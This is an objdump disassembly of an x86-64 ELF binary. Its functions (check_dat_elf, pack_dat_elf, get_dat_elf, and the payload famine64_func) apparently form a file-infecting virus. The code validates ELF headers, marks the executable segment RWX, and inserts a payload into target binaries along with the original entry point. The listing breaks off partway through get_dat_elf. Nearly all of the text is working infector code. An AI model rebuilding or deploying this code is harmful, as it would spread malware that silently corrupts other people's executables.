
./new:     file format elf64-x86-64


Disassembly of section .init:

0000000000000610 <_init>:
 610:	sub    rsp,0x8
 614:	mov    rax,QWORD PTR [rip+0x2029c5]        # 202fe0 <__gmon_start__>
 61b:	test   rax,rax
 61e:	je     622 <_init+0x12>
 620:	call   rax
 622:	add    rsp,0x8
 626:	ret    

Disassembly of section .plt:

0000000000000630 <.plt>:
 630:	push   QWORD PTR [rip+0x2029d2]        # 203008 <_GLOBAL_OFFSET_TABLE_+0x8>
 636:	jmp    QWORD PTR [rip+0x2029d4]        # 203010 <_GLOBAL_OFFSET_TABLE_+0x10>
 63c:	nop    DWORD PTR [rax+0x0]

0000000000000640 <puts@plt>:
 640:	jmp    QWORD PTR [rip+0x2029d2]        # 203018 <puts@GLIBC_2.2.5>
 646:	push   0x0
 64b:	jmp    630 <.plt>

0000000000000650 <write@plt>:
 650:	jmp    QWORD PTR [rip+0x2029ca]        # 203020 <write@GLIBC_2.2.5>
 656:	push   0x1
 65b:	jmp    630 <.plt>

0000000000000660 <printf@plt>:
 660:	jmp    QWORD PTR [rip+0x2029c2]        # 203028 <printf@GLIBC_2.2.5>
 666:	push   0x2
 66b:	jmp    630 <.plt>

0000000000000670 <syscall@plt>:
 670:	jmp    QWORD PTR [rip+0x2029ba]        # 203030 <syscall@GLIBC_2.2.5>
 676:	push   0x3
 67b:	jmp    630 <.plt>

Disassembly of section .plt.got:

0000000000000680 <.plt.got>:
 680:	jmp    QWORD PTR [rip+0x202972]        # 202ff8 <__cxa_finalize@GLIBC_2.2.5>
 686:	xchg   ax,ax

Disassembly of section .text:

0000000000000690 <main>:
     690:	push   rbx
     691:	lea    rdi,[rip+0x14f5]        # 1b8d <_IO_stdin_used+0x6d>
     698:	lea    rax,[rip+0x14f9]        # 1b98 <_IO_stdin_used+0x78>
     69f:	sub    rsp,0x20
     6a3:	mov    QWORD PTR [rsp],rdi
     6a7:	mov    QWORD PTR [rsp+0x8],rax
     6ac:	mov    rbx,rsp
     6af:	mov    QWORD PTR [rsp+0x10],0x0
     6b8:	add    rbx,0x8
     6bc:	call   12b0 <find_files>
     6c1:	mov    rdi,QWORD PTR [rbx]
     6c4:	test   rdi,rdi
     6c7:	jne    6b8 <main+0x28>
     6c9:	add    rsp,0x20
     6cd:	xor    eax,eax
     6cf:	pop    rbx
     6d0:	ret    
     6d1:	nop    WORD PTR cs:[rax+rax*1+0x0]
     6db:	nop    DWORD PTR [rax+rax*1+0x0]

00000000000006e0 <_start>:
     6e0:	xor    ebp,ebp
     6e2:	mov    r9,rdx
     6e5:	pop    rsi
     6e6:	mov    rdx,rsp
     6e9:	and    rsp,0xfffffffffffffff0
     6ed:	push   rax
     6ee:	push   rsp
     6ef:	lea    r8,[rip+0x141a]        # 1b10 <__libc_csu_fini>
     6f6:	lea    rcx,[rip+0x13a3]        # 1aa0 <__libc_csu_init>
     6fd:	lea    rdi,[rip+0xffffffffffffff8c]        # 690 <main>
     704:	call   QWORD PTR [rip+0x2028ce]        # 202fd8 <__libc_start_main@GLIBC_2.2.5>
     70a:	hlt    
     70b:	nop    DWORD PTR [rax+rax*1+0x0]

0000000000000710 <deregister_tm_clones>:
     710:	lea    rdi,[rip+0x202931]        # 203048 <__TMC_END__>
     717:	lea    rax,[rip+0x202931]        # 20304f <__TMC_END__+0x7>
     71e:	push   rbp
     71f:	sub    rax,rdi
     722:	mov    rbp,rsp
     725:	cmp    rax,0xe
     729:	jbe    740 <deregister_tm_clones+0x30>
     72b:	mov    rax,QWORD PTR [rip+0x20289e]        # 202fd0 <_ITM_deregisterTMCloneTable>
     732:	test   rax,rax
     735:	je     740 <deregister_tm_clones+0x30>
     737:	pop    rbp
     738:	jmp    rax
     73a:	nop    WORD PTR [rax+rax*1+0x0]
     740:	pop    rbp
     741:	ret    
     742:	nop    DWORD PTR [rax+0x0]
     746:	nop    WORD PTR cs:[rax+rax*1+0x0]

0000000000000750 <register_tm_clones>:
     750:	lea    rdi,[rip+0x2028f1]        # 203048 <__TMC_END__>
     757:	lea    rsi,[rip+0x2028ea]        # 203048 <__TMC_END__>
     75e:	push   rbp
     75f:	sub    rsi,rdi
     762:	mov    rbp,rsp
     765:	sar    rsi,0x3
     769:	mov    rax,rsi
     76c:	shr    rax,0x3f
     770:	add    rsi,rax
     773:	sar    rsi,1
     776:	je     790 <register_tm_clones+0x40>
     778:	mov    rax,QWORD PTR [rip+0x202871]        # 202ff0 <_ITM_registerTMCloneTable>
     77f:	test   rax,rax
     782:	je     790 <register_tm_clones+0x40>
     784:	pop    rbp
     785:	jmp    rax
     787:	nop    WORD PTR [rax+rax*1+0x0]
     790:	pop    rbp
     791:	ret    
     792:	nop    DWORD PTR [rax+0x0]
     796:	nop    WORD PTR cs:[rax+rax*1+0x0]

00000000000007a0 <__do_global_dtors_aux>:
     7a0:	cmp    BYTE PTR [rip+0x2028a1],0x0        # 203048 <__TMC_END__>
     7a7:	jne    7d0 <__do_global_dtors_aux+0x30>
     7a9:	cmp    QWORD PTR [rip+0x202847],0x0        # 202ff8 <__cxa_finalize@GLIBC_2.2.5>
     7b1:	push   rbp
     7b2:	mov    rbp,rsp
     7b5:	je     7c3 <__do_global_dtors_aux+0x23>
     7b7:	mov    rdi,QWORD PTR [rip+0x202882]        # 203040 <__dso_handle>
     7be:	call   680 <.plt.got>
     7c3:	call   710 <deregister_tm_clones>
     7c8:	pop    rbp
     7c9:	mov    BYTE PTR [rip+0x202878],0x1        # 203048 <__TMC_END__>
     7d0:	repz ret 
     7d2:	nop    DWORD PTR [rax+0x0]
     7d6:	nop    WORD PTR cs:[rax+rax*1+0x0]

00000000000007e0 <frame_dummy>:
     7e0:	lea    rdi,[rip+0x2025e1]        # 202dc8 <__JCR_END__>
     7e7:	cmp    QWORD PTR [rdi],0x0
     7eb:	jne    7f8 <frame_dummy+0x18>
     7ed:	jmp    750 <register_tm_clones>
     7f2:	nop    WORD PTR [rax+rax*1+0x0]
     7f8:	mov    rax,QWORD PTR [rip+0x2027e9]        # 202fe8 <_Jv_RegisterClasses>
     7ff:	test   rax,rax
     802:	je     7ed <frame_dummy+0xd>
     804:	push   rbp
     805:	mov    rbp,rsp
     808:	call   rax
     80a:	pop    rbp
     80b:	jmp    750 <register_tm_clones>

0000000000000810 <check_dat_elf>:
     810:	xor    eax,eax
     812:	cmp    rdi,0x3f
     816:	jbe    820 <check_dat_elf+0x10>
     818:	cmp    DWORD PTR [rsi],0x464c457f
     81e:	je     828 <check_dat_elf+0x18>
     820:	repz ret 
     822:	nop    WORD PTR [rax+rax*1+0x0]
     828:	cmp    BYTE PTR [rsi+0x4],0x2
     82c:	jne    820 <check_dat_elf+0x10>
     82e:	cmp    BYTE PTR [rsi+0x5],0x0
     832:	je     820 <check_dat_elf+0x10>
     834:	cmp    BYTE PTR [rsi+0x6],0x1
     838:	jne    820 <check_dat_elf+0x10>
     83a:	movzx  ecx,WORD PTR [rsi+0x10]
     83e:	lea    edx,[rcx-0x2]
     841:	cmp    dx,0x1
     845:	ja     820 <check_dat_elf+0x10>
     847:	cmp    WORD PTR [rsi+0x12],0x3e
     84c:	jne    820 <check_dat_elf+0x10>
     84e:	cmp    QWORD PTR [rsi+0x20],0x40
     853:	jne    820 <check_dat_elf+0x10>
     855:	movzx  ecx,WORD PTR [rsi+0x38]
     859:	lea    rdx,[rcx*8+0x0]
     861:	sub    rdx,rcx
     864:	lea    rdx,[rdx*8+0x40]
     86c:	cmp    rdi,rdx
     86f:	jb     820 <check_dat_elf+0x10>
     871:	mov    r8,QWORD PTR [rsi+0x28]
     875:	cmp    r8,0x3f
     879:	jbe    820 <check_dat_elf+0x10>
     87b:	movzx  edx,WORD PTR [rsi+0x3c]
     87f:	mov    rcx,rdx
     882:	shl    rdx,0x6
     886:	add    rdx,r8
     889:	cmp    rdi,rdx
     88c:	jb     820 <check_dat_elf+0x10>
     88e:	cmp    DWORD PTR [rsi+0x34],0x380040
     895:	jne    820 <check_dat_elf+0x10>
     897:	cmp    WORD PTR [rsi+0x3a],0x40
     89c:	jne    820 <check_dat_elf+0x10>
     89e:	movzx  edx,WORD PTR [rsi+0x3e]
     8a2:	test   dx,dx
     8a5:	sete   al
     8a8:	cmp    cx,dx
     8ab:	setbe  dl
     8ae:	or     eax,edx
     8b0:	xor    eax,0x1
     8b3:	movzx  eax,al
     8b6:	ret    
     8b7:	nop    WORD PTR [rax+rax*1+0x0]

00000000000008c0 <pack_dat_elf>:
     8c0:	push   r15
     8c2:	push   r14
     8c4:	mov    rax,rdx
     8c7:	push   r13
     8c9:	push   r12
     8cb:	push   rbp
     8cc:	push   rbx
     8cd:	mov    rbp,rdx
     8d0:	sub    rsp,0xc8
     8d7:	add    rax,QWORD PTR [rdx+0x20]     ; data + data->e_phoff
     8db:	movzx  r13d,WORD PTR [rdx+0x3c]     ; data->e_shnum
     8e0:	add    rbp,QWORD PTR [rdx+0x28]     ; data + data->e_shoff
     8e4:	mov    QWORD PTR [rsp+0x8],rdi
     8e9:	mov    QWORD PTR [rsp],rax
     8ed:	movzx  eax,WORD PTR [rdx+0x3e]      ; data->e_shstrndx
     8f1:	shl    rax,0x6
     8f5:	test   r13,r13
     8f8:	mov    r14,QWORD PTR [rbp+rax*1+0x18]   ; section[idx].sh_offset
     8fd:	je     9a6 <pack_dat_elf+0xe6>      ; return
     903:	lea    r15,[rip+0x121a]        # 1b24 <_IO_stdin_used+0x4>
     90a:	mov    r12,rbp
     90d:	mov    r10,rbp
     910:	xor    r11d,r11d
     913:	nop    DWORD PTR [rax+rax*1+0x0]
     918:	mov    eax,DWORD PTR [r10]
     91b:	mov    rbx,r10
     91e:	add    rax,r14
     921:	add    rax,rdx
     924:	je     966 <pack_dat_elf+0xa6>
     926:	movzx  ecx,BYTE PTR [rax]
     929:	test   cl,cl
     92b:	je     966 <pack_dat_elf+0xa6>
     92d:	cmp    cl,0x2e
     930:	jne    966 <pack_dat_elf+0xa6>
     932:	mov    rdi,r15
     935:	jmp    94d <pack_dat_elf+0x8d>
     937:	nop    WORD PTR [rax+rax*1+0x0]
     940:	cmp    cl,r8b
     943:	mov    rdi,r9
     946:	jne    961 <pack_dat_elf+0xa1>
     948:	test   r8b,r8b
     94b:	je     961 <pack_dat_elf+0xa1>
     94d:	add    rax,0x1
     951:	movzx  ecx,BYTE PTR [rax]
     954:	lea    r9,[rdi+0x1]
     958:	movzx  r8d,BYTE PTR [rdi+0x1]
     95d:	test   cl,cl
     95f:	jne    940 <pack_dat_elf+0x80>
     961:	cmp    cl,r8b
     964:	je     9b8 <pack_dat_elf+0xf8>
     966:	add    r11,0x1
     96a:	add    r10,0x40
     96e:	cmp    r13,r11
     971:	jne    918 <pack_dat_elf+0x58>
     973:	mov    rdi,QWORD PTR [rdx+0x18]
     977:	mov    rax,rbp
     97a:	xor    r8d,r8d
     97d:	nop    DWORD PTR [rax]
     980:	mov    rcx,QWORD PTR [rax+0x18]
     984:	mov    rbx,rax
     987:	cmp    rcx,rdi
     98a:	ja     999 <pack_dat_elf+0xd9>
     98c:	add    rcx,QWORD PTR [rax+0x20]
     990:	cmp    rcx,rdi
     993:	ja     ccc <pack_dat_elf+0x40c>
     999:	add    r8,0x1
     99d:	add    rax,0x40
     9a1:	cmp    r13,r8
     9a4:	jne    980 <pack_dat_elf+0xc0>
     9a6:	add    rsp,0xc8
     9ad:	pop    rbx
     9ae:	pop    rbp
     9af:	pop    r12
     9b1:	pop    r13
     9b3:	pop    r14
     9b5:	pop    r15
     9b7:	ret    
     9b8:	movzx  edi,WORD PTR [rdx+0x38]
     9bc:	test   rdi,rdi
     9bf:	je     973 <pack_dat_elf+0xb3>
     9c1:	mov    rax,QWORD PTR [rsp]
     9c5:	xor    ecx,ecx
     9c7:	jmp    9dd <pack_dat_elf+0x11d>
     9c9:	nop    DWORD PTR [rax+0x0]
     9d0:	add    rcx,0x1
     9d4:	add    rax,0x38
     9d8:	cmp    rcx,rdi
     9db:	je     973 <pack_dat_elf+0xb3>
     9dd:	cmp    DWORD PTR [rax],0x1
     9e0:	mov    r14,rax
     9e3:	jne    9d0 <pack_dat_elf+0x110>
     9e5:	mov    r9,QWORD PTR [r10+0x18]
     9e9:	mov    r8,QWORD PTR [rax+0x10]
     9ed:	cmp    r9,r8
     9f0:	jb     9d0 <pack_dat_elf+0x110>
     9f2:	add    r8,QWORD PTR [rax+0x20]
     9f6:	cmp    r9,r8
     9f9:	jae    9d0 <pack_dat_elf+0x110>
     9fb:	mov    rdi,QWORD PTR [rdx+0x18]
     9ff:	mov    rcx,QWORD PTR [rdx+rdi*1-0x8]
     a04:	mov    r15,QWORD PTR [rsp+0x8]
     a09:	lea    rdi,[rip+0x111a]        # 1b2a <_IO_stdin_used+0xa>
     a10:	mov    DWORD PTR [rsp+0x14],esi
     a14:	xor    eax,eax
     a16:	mov    r13,rdx
     a19:	mov    rsi,r15
     a1c:	mov    rdx,rcx
     a1f:	mov    QWORD PTR [rsp+0x8],rcx
     a24:	call   660 <printf@plt>
     a29:	mov    rcx,QWORD PTR [rsp+0x8]
     a2e:	cmp    rcx,QWORD PTR [rip+0x92b]        # 1360 <famine64_func>
     a35:	je     d20 <pack_dat_elf+0x460>
     a3b:	lea    rdx,[rsp+0x30]
     a40:	mov    rsi,r15
     a43:	mov    edi,0x4
     a48:	xor    eax,eax
     a4a:	call   670 <syscall@plt>
     a4f:	mov    ecx,DWORD PTR [rsp+0x48]
     a53:	xor    eax,eax
     a55:	mov    edx,0x281
     a5a:	mov    rsi,r15
     a5d:	mov    edi,0x2
     a62:	call   670 <syscall@plt>
     a67:	cmp    eax,0xffffffff
     a6a:	mov    QWORD PTR [rsp+0x8],rax
     a6f:	mov    DWORD PTR [rsp+0x10],eax
     a73:	je     d31 <pack_dat_elf+0x471>
     a79:	mov    r15,QWORD PTR [r14+0x20]
     a7d:	add    r15,QWORD PTR [r14+0x8]
     a81:	mov    rax,QWORD PTR [r13+0x18]
     a85:	movzx  ecx,WORD PTR [r13+0x38]
     a8a:	sub    rax,r15
     a8d:	mov    QWORD PTR [rsp+0x28],rax
     a92:	lea    rax,[r15+0x8]
     a96:	test   rcx,rcx
     a99:	mov    QWORD PTR [r13+0x18],rax
     a9d:	je     d54 <pack_dat_elf+0x494>
     aa3:	mov    rsi,QWORD PTR [rsp]
     aa7:	lea    rdx,[rcx*8+0x0]
     aaf:	sub    rdx,rcx
     ab2:	xor    ecx,ecx
     ab4:	mov    rax,rsi
     ab7:	lea    rsi,[rsi+rdx*8]
     abb:	nop    DWORD PTR [rax+rax*1+0x0]
     ac0:	mov    rdx,QWORD PTR [rax+0x8]
     ac4:	cmp    r15,rdx
     ac7:	jae    ada <pack_dat_elf+0x21a>
     ac9:	test   rcx,rcx
     acc:	je     d18 <pack_dat_elf+0x458>
     ad2:	cmp    rdx,QWORD PTR [rcx+0x8]
     ad6:	cmovb  rcx,rax
     ada:	add    rax,0x38
     ade:	cmp    rsi,rax
     ae1:	jne    ac0 <pack_dat_elf+0x200>
     ae3:	mov    esi,DWORD PTR [rip+0xf45]        # 1a2e <famine64_size>
     ae9:	lea    rdi,[rip+0x107b]        # 1b6b <_IO_stdin_used+0x4b>
     af0:	xor    eax,eax
     af2:	mov    QWORD PTR [rsp+0x18],rcx
     af7:	call   660 <printf@plt>
     afc:	mov    rcx,QWORD PTR [rsp+0x18]
     b01:	test   rcx,rcx
     b04:	je     9a6 <pack_dat_elf+0xe6>
     b0a:	mov    rsi,QWORD PTR [r14+0x20]
     b0e:	mov    r8d,DWORD PTR [rip+0xf19]        # 1a2e <famine64_size>
     b15:	mov    rdx,rsi
     b18:	add    rdx,QWORD PTR [r14+0x8]
     b1c:	lea    rax,[rdx+r8*1]
     b20:	cmp    rax,QWORD PTR [rcx+0x8]
     b24:	jbe    bc2 <pack_dat_elf+0x302>
     b2a:	test   r8,r8
     b2d:	je     b41 <pack_dat_elf+0x281>
     b2f:	sub    r8,0x1
     b33:	and    r8,0xfffffffffffff000
     b3a:	add    r8,0x1000
     b41:	movzx  edi,WORD PTR [r13+0x38]
     b46:	add    QWORD PTR [r13+0x28],r8
     b4a:	test   rdi,rdi
     b4d:	je     b8f <pack_dat_elf+0x2cf>
     b4f:	mov    rax,QWORD PTR [rsp]
     b53:	xor    r9d,r9d
     b56:	add    rax,0x8
     b5a:	jmp    b67 <pack_dat_elf+0x2a7>
     b5c:	nop    DWORD PTR [rax+0x0]
     b60:	mov    rdx,rsi
     b63:	add    rdx,QWORD PTR [r14+0x8]
     b67:	mov    rcx,QWORD PTR [rax]
     b6a:	cmp    rcx,rdx
     b6d:	jb     b82 <pack_dat_elf+0x2c2>
     b6f:	add    rdx,r8
     b72:	cmp    rdx,QWORD PTR [rax+0x8]
     b76:	ja     9a6 <pack_dat_elf+0xe6>
     b7c:	add    rcx,r8
     b7f:	mov    QWORD PTR [rax],rcx
     b82:	add    r9,0x1
     b86:	add    rax,0x38
     b8a:	cmp    rdi,r9
     b8d:	jne    b60 <pack_dat_elf+0x2a0>
     b8f:	movzx  eax,WORD PTR [r13+0x3c]
     b94:	test   rax,rax
     b97:	je     bc2 <pack_dat_elf+0x302>
     b99:	mov    rdx,rsi
     b9c:	add    rdx,QWORD PTR [r14+0x8]
     ba0:	shl    rax,0x6
     ba4:	add    rbp,rax
     ba7:	mov    rax,QWORD PTR [r12+0x18]
     bac:	cmp    rdx,rax
     baf:	ja     bb9 <pack_dat_elf+0x2f9>
     bb1:	add    rax,r8
     bb4:	mov    QWORD PTR [r12+0x18],rax
     bb9:	add    r12,0x40
     bbd:	cmp    rbp,r12
     bc0:	jne    ba7 <pack_dat_elf+0x2e7>
     bc2:	add    rsi,r8
     bc5:	add    QWORD PTR [r14+0x28],r8
     bc9:	mov    DWORD PTR [r14+0x4],0x7
     bd1:	mov    QWORD PTR [r14+0x20],rsi
     bd5:	add    QWORD PTR [rbx+0x20],r8
     bd9:	mov    rcx,r15
     bdc:	mov    rbx,QWORD PTR [rsp+0x8]
     be1:	mov    rdx,r13
     be4:	mov    edi,0x1
     be9:	xor    eax,eax
     beb:	mov    QWORD PTR [rsp],r8
     bef:	mov    esi,ebx
     bf1:	call   670 <syscall@plt>
     bf6:	mov    ecx,DWORD PTR [rip+0xe32]        # 1a2e <famine64_size>
     bfc:	lea    rdx,[rip+0x75d]        # 1360 <famine64_func>
     c03:	mov    esi,ebx
     c05:	mov    edi,0x1
     c0a:	xor    eax,eax
     c0c:	sub    rcx,0x8
     c10:	call   670 <syscall@plt>
     c15:	lea    rdx,[rsp+0x28]
     c1a:	xor    eax,eax
     c1c:	mov    ecx,0x8
     c21:	mov    esi,ebx
     c23:	mov    edi,0x1
     c28:	call   670 <syscall@plt>
     c2d:	mov    eax,DWORD PTR [rip+0xdfb]        # 1a2e <famine64_size>
     c33:	mov    r8,QWORD PTR [rsp]
     c37:	cmp    r8,rax
     c3a:	je     d4c <pack_dat_elf+0x48c>
     c40:	cmp    r8,rax
     c43:	lea    rbp,[r8-0x1]
     c47:	lea    rbx,[rip+0xf56]        # 1ba4 <_IO_stdin_used+0x84>
     c4e:	mov    r12d,DWORD PTR [rsp+0x10]
     c53:	ja     c63 <pack_dat_elf+0x3a3>
     c55:	jmp    c89 <pack_dat_elf+0x3c9>
     c57:	nop    WORD PTR [rax+rax*1+0x0]
     c60:	mov    rbp,rdx
     c63:	mov    rdx,rbx
     c66:	xor    eax,eax
     c68:	mov    ecx,0x1
     c6d:	mov    esi,r12d
     c70:	mov    edi,0x1
     c75:	call   670 <syscall@plt>
     c7a:	mov    eax,DWORD PTR [rip+0xdae]        # 1a2e <famine64_size>
     c80:	lea    rdx,[rbp-0x1]
     c84:	cmp    rax,rbp
     c87:	jb     c60 <pack_dat_elf+0x3a0>
     c89:	movsxd rcx,DWORD PTR [rsp+0x14]
     c8e:	mov    rbx,QWORD PTR [rsp+0x8]
     c93:	lea    rdx,[r13+r15*1+0x0]
     c98:	mov    edi,0x1
     c9d:	xor    eax,eax
     c9f:	mov    esi,ebx
     ca1:	sub    rcx,0x1
     ca5:	sub    rcx,r15
     ca8:	call   670 <syscall@plt>
     cad:	mov    esi,ebx
     caf:	mov    edi,0x3
     cb4:	xor    eax,eax
     cb6:	call   670 <syscall@plt>
     cbb:	lea    rdi,[rip+0xebe]        # 1b80 <_IO_stdin_used+0x60>
     cc2:	call   640 <puts@plt>
     cc7:	jmp    9a6 <pack_dat_elf+0xe6>
     ccc:	movzx  r8d,WORD PTR [rdx+0x38]
     cd1:	test   r8,r8
     cd4:	je     9a6 <pack_dat_elf+0xe6>
     cda:	mov    rax,QWORD PTR [rsp]
     cde:	xor    ecx,ecx
     ce0:	jmp    cf9 <pack_dat_elf+0x439>
     ce2:	nop    WORD PTR [rax+rax*1+0x0]
     ce8:	add    rcx,0x1
     cec:	add    rax,0x38
     cf0:	cmp    rcx,r8
     cf3:	je     9a6 <pack_dat_elf+0xe6>
     cf9:	cmp    DWORD PTR [rax],0x1
     cfc:	mov    r14,rax
     cff:	jne    ce8 <pack_dat_elf+0x428>
     d01:	mov    r9,QWORD PTR [rax+0x10]
     d05:	cmp    r9,rdi
     d08:	ja     ce8 <pack_dat_elf+0x428>
     d0a:	add    r9,QWORD PTR [rax+0x20]
     d0e:	cmp    r9,rdi
     d11:	jbe    ce8 <pack_dat_elf+0x428>
     d13:	jmp    9ff <pack_dat_elf+0x13f>
     d18:	mov    rcx,rax
     d1b:	jmp    ada <pack_dat_elf+0x21a>
     d20:	lea    rdi,[rip+0xe1d]        # 1b44 <_IO_stdin_used+0x24>
     d27:	call   640 <puts@plt>
     d2c:	jmp    9a6 <pack_dat_elf+0xe6>
     d31:	lea    rsi,[rip+0xe21]        # 1b59 <_IO_stdin_used+0x39>
     d38:	mov    edx,0x11
     d3d:	mov    edi,0x1
     d42:	call   650 <write@plt>
     d47:	jmp    9a6 <pack_dat_elf+0xe6>
     d4c:	add    r15,r8
     d4f:	jmp    c89 <pack_dat_elf+0x3c9>
     d54:	mov    esi,DWORD PTR [rip+0xcd4]        # 1a2e <famine64_size>
     d5a:	lea    rdi,[rip+0xe0a]        # 1b6b <_IO_stdin_used+0x4b>
     d61:	xor    eax,eax
     d63:	call   660 <printf@plt>
     d68:	jmp    9a6 <pack_dat_elf+0xe6>
     d6d:	nop    DWORD PTR [rax]

0000000000000d70 <get_dat_elf>:
     d70:	push   r15
     d72:	push   r14
     d74:	push   r13
     d76:	push   r12
     d78:	push   rbp
     d79:	push   rbx
     d7a:	sub    rsp,0x828
     d81:	movzx  edx,BYTE PTR [rdi]
     d84:	test   dl,dl
     d86:	je     129e <get_dat_elf+0x52e>
     d8c:	lea    r8,[rsp+0x1f]
     d91:	mov    eax,0x1
     d96:	nop    WORD PTR cs:[rax+rax*1+0x0]
     da0:	mov    BYTE PTR [r8+rax*1],dl
     da4:	mov    ecx,eax
     da6:	add    rax,0x1
     daa:	movzx  edx,BYTE PTR [rdi+rax*1-0x1]
     daf:	test   dl,dl
     db1:	jne    da0 <get_dat_elf+0x30>
     db3:	movzx  edx,BYTE PTR [rsi]
     db6:	test   dl,dl
     db8:	je     128c <get_dat_elf+0x51c>
     dbe:	lea    rbx,[rsp+0x20]
     dc3:	movsxd rdi,ecx
     dc6:	mov    eax,0x1
     dcb:	mov    QWORD PTR [rsp+0x8],rbx
     dd0:	add    rdi,rbx
     dd3:	nop    DWORD PTR [rax+rax*1+0x0]
     dd8:	mov    BYTE PTR [rdi+rax*1-0x1],dl
     ddc:	mov    r8d,eax
     ddf:	add    rax,0x1
     de3:	movzx  edx,BYTE PTR [rsi+rax*1-0x1]
     de8:	test   dl,dl
     dea:	jne    dd8 <get_dat_elf+0x68>
     dec:	mov    rsi,QWORD PTR [rsp+0x8]
     df1:	add    ecx,r8d
     df4:	movsxd rcx,ecx
     df7:	xor    eax,eax
     df9:	mov    edx,0x800
     dfe:	mov    BYTE PTR [rsp+rcx*1+0x20],0x0
     e03:	mov    edi,0x2
     e08:	xor    ecx,ecx
     e0a:	call   670 <syscall@plt>
     e0f:	cmp    eax,0xffffffff
     e12:	mov    rbp,rax
     e15:	mov    r12d,eax
     e18:	je     113a <get_dat_elf+0x3ca>
     e1e:	mov    esi,eax
     e20:	mov    ecx,0x2
     e25:	xor    eax,eax
     e27:	mov    edx,0x1
     e2c:	mov    edi,0x8
     e31:	call   670 <syscall@plt>
     e36:	test   eax,eax
     e38:	mov    QWORD PTR [rsp+0x10],rax
     e3d:	jle    112c <get_dat_elf+0x3bc>
     e43:	sub    rsp,0x8
     e47:	xor    esi,esi
     e49:	xor    eax,eax
     e4b:	push   0x0
     e4d:	mov    edx,DWORD PTR [rsp+0x20]
     e51:	mov    r9d,0xffffffff
     e57:	mov    r8d,0x22
     e5d:	mov    ecx,0x3
     e62:	mov    edi,0x9
     e67:	call   670 <syscall@plt>
     e6c:	mov    r14,rax
     e6f:	cmp    r14,0xffffffffffffffff
     e73:	pop    rax
     e74:	pop    rdx
     e75:	je     112c <get_dat_elf+0x3bc>
     e7b:	xor    ecx,ecx
     e7d:	xor    edx,edx
     e7f:	xor    eax,eax
     e81:	mov    esi,ebp
     e83:	mov    edi,0x8
     e88:	call   670 <syscall@plt>
     e8d:	test   rax,rax
     e90:	js     11c6 <get_dat_elf+0x456>
     e96:	lea    rax,[r14+0x10]
     e9a:	lea    r13,[rsp+0x420]
     ea2:	mov    QWORD PTR [rsp+0x18],rbp
     ea7:	xor    r15d,r15d
     eaa:	mov    rdi,rax
     ead:	lea    rax,[rsp+0x430]
     eb5:	mov    rbp,r13
     eb8:	mov    rbx,rdi
     ebb:	mov    QWORD PTR [rsp],rax
     ebf:	mov    rax,r14
     ec2:	sub    rax,r13
     ec5:	mov    r13,r14
     ec8:	mov    r14,rax
     ecb:	nop    DWORD PTR [rax+rax*1+0x0]
     ed0:	xor    edi,edi
     ed2:	xor    eax,eax
     ed4:	mov    ecx,0x400
     ed9:	mov    rdx,rbp
     edc:	mov    esi,r12d
     edf:	call   670 <syscall@plt>
     ee4:	test   eax,eax
     ee6:	jle    1176 <get_dat_elf+0x406>
     eec:	movsxd rdi,r15d
     eef:	lea    rdx,[rbx+rdi*1]
     ef3:	lea    r10,[rdi+r13*1]
     ef7:	cmp    rbp,rdx
     efa:	setae  cl
     efd:	cmp    QWORD PTR [rsp],r10
     f01:	setbe  dl
     f04:	or     cl,dl
     f06:	je     114c <get_dat_elf+0x3dc>
     f0c:	cmp    eax,0xf
     f0f:	jbe    114c <get_dat_elf+0x3dc>
     f15:	lea    edi,[rax-0x10]
     f18:	xor    ecx,ecx
     f1a:	xor    esi,esi
     f1c:	shr    edi,0x4
     f1f:	add    edi,0x1
     f22:	mov    edx,edi
     f24:	shl    edx,0x4
     f27:	nop    WORD PTR [rax+rax*1+0x0]
     f30:	movdqa xmm0,XMMWORD PTR [rbp+rcx*1+0x0]
     f36:	add    esi,0x1
     f39:	add    rcx,0x10
     f3d:	movups XMMWORD PTR [rcx+r10*1-0x10],xmm0
     f43:	cmp    edi,esi
     f45:	ja     f30 <get_dat_elf+0x1c0>
     f47:	cmp    eax,edx
     f49:	je     1124 <get_dat_elf+0x3b4>
     f4f:	movsxd rcx,edx
     f52:	movzx  esi,BYTE PTR [rsp+rcx*1+0x420]
     f5a:	lea    ecx,[r15+rdx*1]
     f5e:	movsxd rcx,ecx
     f61:	mov    BYTE PTR [r13+rcx*1+0x0],sil
     f66:	lea    ecx,[rdx+0x1]
     f69:	cmp    eax,ecx
     f6b:	jle    1124 <get_dat_elf+0x3b4>
     f71:	movsxd rsi,ecx
     f74:	add    ecx,r15d
     f77:	movzx  esi,BYTE PTR [rsp+rsi*1+0x420]
     f7f:	movsxd rcx,ecx
     f82:	mov    BYTE PTR [r13+rcx*1+0x0],sil
     f87:	lea    ecx,[rdx+0x2]
     f8a:	cmp    eax,ecx
     f8c:	jle    1124 <get_dat_elf+0x3b4>
     f92:	movsxd rsi,ecx
     f95:	add    ecx,r15d
     f98:	movzx  esi,BYTE PTR [rsp+rsi*1+0x420]
     fa0:	movsxd rcx,ecx
     fa3:	mov    BYTE PTR [r13+rcx*1+0x0],sil
     fa8:	lea    ecx,[rdx+0x3]
     fab:	cmp    eax,ecx
     fad:	jle    1124 <get_dat_elf+0x3b4>
     fb3:	movsxd rsi,ecx
     fb6:	add    ecx,r15d
     fb9:	movzx  esi,BYTE PTR [rsp+rsi*1+0x420]
     fc1:	movsxd rcx,ecx
     fc4:	mov    BYTE PTR [r13+rcx*1+0x0],sil
     fc9:	lea    ecx,[rdx+0x4]
     fcc:	cmp    eax,ecx
     fce:	jle    1124 <get_dat_elf+0x3b4>
     fd4:	movsxd rsi,ecx
     fd7:	add    ecx,r15d
     fda:	movzx  esi,BYTE PTR [rsp+rsi*1+0x420]
     fe2:	movsxd rcx,ecx
     fe5:	mov    BYTE PTR [r13+rcx*1+0x0],sil
     fea:	lea    ecx,[rdx+0x5]
     fed:	cmp    eax,ecx
     fef:	jle    1124 <get_dat_elf+0x3b4>
     ff5:	movsxd rsi,ecx
     ff8:	add    ecx,r15d
     ffb:	movzx  esi,BYTE PTR [rsp+rsi*1+0x420]
    1003:	movsxd rcx,ecx
    1006:	mov    BYTE PTR [r13+rcx*1+0x0],sil
    100b:	lea    ecx,[rdx+0x6]
    100e:	cmp    eax,ecx
    1010:	jle    1124 <get_dat_elf+0x3b4>
    1016:	movsxd rsi,ecx
    1019:	add    ecx,r15d
    101c:	movzx  esi,BYTE PTR [rsp+rsi*1+0x420]
    1024:	movsxd rcx,ecx
    1027:	mov    BYTE PTR [r13+rcx*1+0x0],sil
    102c:	lea    ecx,[rdx+0x7]
    102f:	cmp    eax,ecx
    1031:	jle    1124 <get_dat_elf+0x3b4>
    1037:	movsxd rsi,ecx
